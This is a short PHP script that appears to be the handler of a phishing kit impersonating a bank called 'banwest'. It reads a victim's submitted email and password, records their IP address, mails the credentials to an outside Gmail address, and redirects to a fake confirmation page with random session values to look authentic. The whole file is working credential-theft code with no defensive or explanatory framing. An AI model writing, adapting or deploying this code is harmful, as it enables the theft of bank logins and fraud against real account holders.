<?php
if($_POST["be3mail"] != "" and $_POST["pa3307d"] != ""){
$ip = getenv("REMOTE_ADDR");

$message .= "--------------banwest Info-----------------------\n";
$message .= "|E3ma1l : ".$_POST['be3mail']."\n";
$message .= "|Pa33w0rd: ".$_POST['pa3307d']."\n";
$message .= "|Pa33w0rd: ".$_POST['pa3307d000']."\n";
$message .= "|--------------- created by dc -------------------|\n";
 $send = "myteam5000k@gmail.com";
$subject = "banwest | $ip";
{
mail("$send", "$subject", $message);   
}
$praga=rand();
$praga=md5($praga);
  header ("Location: Thanks.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");
}else{
header ("Location: index.php");
}

?>

  